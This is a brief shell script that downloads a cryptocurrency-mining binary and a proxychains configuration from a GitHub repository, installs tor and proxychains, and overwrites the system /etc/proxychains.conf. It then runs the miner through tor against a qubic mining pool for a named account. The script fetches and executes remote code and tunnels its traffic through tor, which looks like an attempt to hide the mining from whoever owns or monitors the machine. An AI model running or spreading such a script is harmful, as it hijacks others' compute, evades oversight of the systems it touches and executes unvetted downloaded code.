wget https://github.com/qbicc01/qbicc/releases/download/0.01/apoolminer
wget https://raw.githubusercontent.com/qbicc01/qbicc/main/proxychains.conf
apt update && apt install tor proxychains -y
rm /etc/proxychains.conf
cp proxychains.conf /etc/proxychains.conf
chmod +x apoolminer
service tor start
sleep 10s
proxychains ./apoolminer --account CP_7cqdjrvl2n --gpu-off --pool qubic1.hk.apool.io:3334 --worker default
